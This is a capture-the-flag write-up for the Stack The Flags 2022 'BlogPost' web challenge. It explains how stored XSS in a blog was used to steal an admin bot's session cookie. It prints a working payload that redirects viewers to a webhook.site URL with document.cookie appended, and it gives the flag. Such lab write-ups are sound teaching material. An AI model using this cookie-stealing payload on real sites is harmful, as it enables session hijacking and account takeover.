# Stack The Flags 2022: BlogPost

![Contest Date: 02.12.2022](https://img.shields.io/badge/Contest%20Date-02.12.2022-lightgrey.svg)
![Solve Moment: During The Contest](https://img.shields.io/badge/Solve%20Moment-During%20The%20Contest-brightgreen.svg)
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-brightgreen)

## Description

> Jaga created an internal social media platform for the company, can you leak anyone's information?



## Attached Files

- [Source code](https://github.com/seanLimWeiRen/STF22_writeups/tree/main/Web/BlogPost/attached_files)

## Summary

We use XSS to steal the admin's session cookies

## Flag

```
STF22{s1mpl3_p0st_xSs_:)}
```

## Detailed Solution

Upon visiting the website and clicking the login button, we are greeted with a login page which gives us a link to register an account.

![1.png](images/1.png)

After registering an account and logging in with it, we can see that an admin has created a post, providing us with the information that there is an admin account and we might need to gain access to it.

![2.png](images/2.png)

### Finding the vulnerability

I tried to login to the admin account with SQL injection, but it did not work

![3.png](images/3.png)

Read more about SQL injection ![here](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)

Luckily, one of the first things that I thought to test was XSS, so I used `<script>alert('xss')</script>` to test if it was vulnerable.

![4.png](images/4.png)

Indeed, the alert box popped up to show that the blog was vulnerable to XSS

![5.png](images/5.png)

#### How does XSS work? (for beginners)

XSS works by manipulating a website to return possibly malicious javascript code to its users, and it is run on the web browsers of the victim(s).
Using the example from earlier, the `<script>` and `</script>` tags are used to embed a client-side script, while `alert('xss')` simply gives us a popup with the text "xss"

### Exploiting the vulnerability

Remember when I mentioned that we could try to gain access to the admin account? That's exactly what we need to do with XSS.
Because your session data is stored in your cookies, we need to exfiltrate the session cookie.

For this, we can either use ![webhook.site](https://webhook.site) or ![PostBin](https://www.toptal.com/developers/postbin/), both work perfectly fine but I prefer to use webhook.site

With the information I had, I created this payload:
```
<script>javascript:document.location='https://webhook.site/55b56003-41e1-481d-8865-4e5463f746d4?cookie='+document.cookie;</script>
```
Don't worry if you don't know what this means, I'll break it down.

#### How does this work?

When a user views the blog, they will be forcefully redirected to `https://webhook.site/55b56003-41e1-481d-8865-4e5463f746d4`, with their session cookie being sent along as a query string as well. The website then logs it and we can view it.

#### The fun part

![6.png](images/6.png)


Now, when we create the post and go to the webhook.site website, we can see that there are 2 GET requests 

![7.png](images/7.png)

One is from our browser, and the other is from the bot/admin
When we look at the query strings from the bot, we can get our flag.

![8.png](images/8.png)

```
STF22{s1mpl3_p0st_xSs_:)}
```


